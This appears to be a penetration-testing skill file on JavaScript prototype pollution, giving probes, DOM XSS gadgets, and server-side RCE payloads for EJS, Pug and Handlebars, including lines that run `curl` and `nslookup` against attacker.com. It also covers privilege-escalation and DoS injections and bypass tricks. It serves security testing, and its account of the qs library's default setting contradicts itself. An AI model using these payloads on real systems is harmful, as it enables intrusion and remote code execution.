---
name: prototype-pollution
description: Prototype pollution testing covering client-side DOM XSS gadgets, server-side Node.js RCE/DoS, and deep merge/path assignment vulnerability patterns
---

# Prototype Pollution

Prototype pollution is a JavaScript-specific vulnerability where an attacker can inject properties into `Object.prototype`, the base prototype shared by all JavaScript objects. Any code that subsequently reads those properties from any plain object will receive the attacker-supplied value. In client-side contexts this commonly leads to DOM-based XSS. In server-side Node.js contexts it leads to remote code execution, authentication bypass, privilege escalation, or denial of service depending on the gadget chain available.

## Attack Surface

**Client-Side (Browser)**
- URL query string parameters merged into application state via vulnerable libraries (jQuery, lodash, merge functions)
- JSON input parsed and recursively merged with default config objects
- DOM-clobbering combined with prototype pollution for escalation
- Hash fragment (`location.hash`) processing without sanitization
- `document.cookie` key-value parsing that performs deep merge

**Server-Side (Node.js)**
- Request body JSON merged into options/config objects (`_.merge`, `deepmerge`, `assign-deep`)
- Query string parameters processed by `qs` library with `allowPrototypes: true`
- YAML/TOML deserialization of user-supplied configuration
- Template engines that merge user input into context objects
- Build systems and dev tools accepting JSON config from user input

**Vulnerable Patterns**
- Deep merge without key sanitization: `merge({}, userInput)` where `userInput` is attacker-controlled
- Recursive property assignment: `obj[key1][key2] = value` where keys are attacker-controlled
- Path-based setters: `_.set(obj, path, value)` where `path` is attacker-controlled
- Clone operations on untrusted objects: `JSON.parse(JSON.stringify(untrusted))` (does not pollute, but `Object.assign({}, parsed)` can)

## High-Value Targets

- Config/options merge endpoints (API settings, preference updates)
- JSON body endpoints processed with deep merge utilities
- URL parameter handling in SPAs using routing libraries
- Server-side rendering contexts (Next.js, Nuxt.js, Express template engines)
- Admin and configuration management APIs
- CI/CD pipeline tools with JSON/YAML config ingestion

## Reconnaissance

### Library Fingerprinting

Identify merge/clone libraries in use:
- Browser: `window._` (lodash), `window.$` (jQuery), check for `deepmerge`, `merge-deep` globals
- Server: `package.json` if accessible (via info disclosure), `node_modules` path in error stacks
- Error messages containing library names in stack traces

### Pollution Probe

Test whether `Object.prototype` accepts injected properties:

**URL query string:**
```
?__proto__[test]=polluted
?constructor[prototype][test]=polluted
?__proto__.test=polluted
```

**JSON body:**
```json
{"__proto__": {"test": "polluted"}}
{"constructor": {"prototype": {"test": "polluted"}}}
```

After submitting, check whether a subsequent request causes changed behavior consistent with a polluted property being read.

### Server-Side Detection

Inject a property that affects response behavior:
```json
{"__proto__": {"toJSON": "polluted"}}
{"__proto__": {"status": 200}}
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('nslookup attacker.com')//"}}
```

For blind detection, use an out-of-band DNS callback via a `child_process` gadget (Node.js).

## Key Vulnerabilities

### Client-Side DOM XSS via Prototype Pollution

Pollute a property that a DOM-manipulation gadget reads from a plain object:

**Step 1 — Pollute:**
```
https://target.com/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
```

**Step 2 — Gadget fires:**
```javascript
// Application code reads innerHTML from config, which now falls back to Object.prototype
element.innerHTML = options.innerHTML || ''
// → element.innerHTML = '<img src=x onerror=alert(1)>'
```

Common gadget properties: `innerHTML`, `src`, `href`, `action`, `srcdoc`, `data`, `location`, `html`, `template`, `url`.

### Server-Side RCE via Template Engine Gadgets

**Pug (Jade) gadget:**
```json
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}
```

**EJS gadget via `outputFunctionName`:**
```json
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('curl https://attacker.com/$(id)');//"}}
```

**Handlebars gadget:**
```json
{"__proto__": {"pendingContent": "<script>require('child_process').execSync('id')</script>"}}
```

### Server-Side Privilege Escalation

Pollute properties checked for authorization decisions:
```json
{"__proto__": {"isAdmin": true}}
{"__proto__": {"role": "admin"}}
{"__proto__": {"authenticated": true}}
```
Any subsequent code doing `if (user.isAdmin)` where `user` is a plain object will inherit the polluted value if `user.isAdmin` is not an own property.

### Denial of Service

Pollute properties that break iteration or serialization:
```json
{"__proto__": {"toString": null}}
{"__proto__": {"length": 1000000}}
{"__proto__": {"0": "a"}}
```
`for...in` loops, `JSON.stringify`, and array-length-dependent operations can hang or throw on polluted prototypes.

### Node.js `child_process` Spawn Options

`child_process.spawn` reads `shell` from the options object. If an attacker can pollute `Object.prototype.shell = true`, any subsequent `spawn` call without an explicit `shell` option will execute the command through a shell, enabling shell metacharacter injection.

### `qs` Library (Query String Parsing)

The `qs` library allows deeply nested query strings by default. Without `allowPrototypes: false`:
```
?__proto__[admin]=true&__proto__[isLoggedIn]=true
```
Parsed result: `{__proto__: {admin: true, isLoggedIn: true}}` — plain `Object.assign` or `merge` of this into any config poisons the prototype.

## Bypass Techniques

**Key Encoding**
- URL-encode underscores: `%5F%5Fproto%5F%5F`
- Unicode normalization: `__ρroto__` if server normalizes before key lookup
- Dotted path: `__proto__.polluted` vs bracket `__proto__[polluted]`

**Alternative Pollution Path**
- `constructor.prototype` — avoids `__proto__` string filters
- Nested accessor: `["__proto__"]["polluted"]` in path-based setters
- Array prototype pollution: `[]["__proto__"]["polluted"]` when input is parsed as array element keys

**Prototype Chain Depth**
- Pollute `Object.prototype` via deeply nested path: `a[b][__proto__][c]=v`
- Merge-based sinks often traverse arbitrary depth

## Testing Methodology

1. **Identify merge/assign sinks** — endpoints accepting JSON, query strings, or YAML processed by deep merge
2. **Send `__proto__` probe** — inject a unique probe property via all three input formats (JSON body, query string, URL path)
3. **Verify pollution** — check if a subsequent request reflects or is affected by the injected property
4. **Test `constructor.prototype`** — alternative path, bypasses simple `__proto__` string filtering
5. **Identify gadgets** — grep JS source for `options.X`, `config.X`, `obj.X` where X is a commonly polluted property
6. **Escalate: client-side** — test DOM gadgets (`innerHTML`, `src`, `href`) via URL fragment or query param pollution
7. **Escalate: server-side** — test template engine gadgets (EJS `outputFunctionName`, Pug `block`) via JSON body
8. **Test privilege properties** — `isAdmin`, `role`, `authenticated`, `permissions`
9. **Test OOB callback** — inject `child_process` gadget, observe DNS/HTTP callback for blind RCE confirmation

## Validation

1. Show the pollution taking effect: send `{"__proto__": {"canary": "polluted"}}`, then send a second request that reads from a plain object and observe `canary` property being inherited
2. For client-side XSS: demonstrate alert or data exfiltration from URL parameter input
3. For server-side RCE: show DNS/HTTP callback confirming code execution via OOB channel
4. For privilege escalation: demonstrate a request as an unprivileged user returning admin-level data after polluting `isAdmin`
5. Reproduce in a clean session to rule out session state contamination

## False Positives

- Server performing `Object.create(null)` for configuration objects (null-prototype objects, immune to pollution)
- Merge library patched against prototype pollution (lodash 4.17.21+, deepmerge 4.x with `isMergeableObject`)
- `JSON.parse` without subsequent spread/merge — parsing alone does not pollute the prototype
- Input filtered on `__proto__` and `constructor` keys before merge
- Framework serializing/deserializing to typed classes (TypeScript class instances, not plain objects)

## Impact

- **Client-side:** DOM-based XSS affecting all users loading a polluted configuration
- **Server-side:** Remote code execution via template engine gadgets in Node.js applications
- **Privilege escalation:** Authentication/authorization bypass by polluting role/admin properties
- **Denial of service:** Application-wide crash by polluting `toString`, `valueOf`, or enumeration properties
- **Supply chain escalation:** Build tool or CI pipeline RCE if prototype pollution exists in the build process

## Pro Tips

1. `constructor.prototype` is the most reliable bypass for `__proto__` string filters — always try both
2. Gadget hunting is the key step; scan the application's minified JS for `options.src`, `config.html`, `settings.template` patterns
3. `lodash.merge` prior to 4.17.17 is vulnerable; check the version in package-lock.json if accessible
4. For Node.js apps using `qs` to parse query strings, test URL params with deeply nested bracket notation
5. Pollution persists for the lifetime of the Node.js worker process (or browser page); a single successful injection affects all subsequent requests on that worker
6. After polluting, check for behavioral changes in unrelated endpoints — prototype pollution is process-wide
7. Combine with SSRF: pollute `proxy`, `host`, or `baseURL` properties to redirect outbound HTTP calls
8. `Object.freeze(Object.prototype)` at application startup is the fix; any app not doing this is potentially exploitable if a merge sink exists

## Summary

Prototype pollution is exploitable wherever untrusted data flows into a deep merge, recursive assign, or path-based setter on plain JavaScript objects. The risk is process-wide: a single polluted property affects every object in the runtime. The fix is to sanitize keys (`__proto__`, `constructor`) before merge, use null-prototype objects for config, or use merge libraries patched against this class of vulnerability.
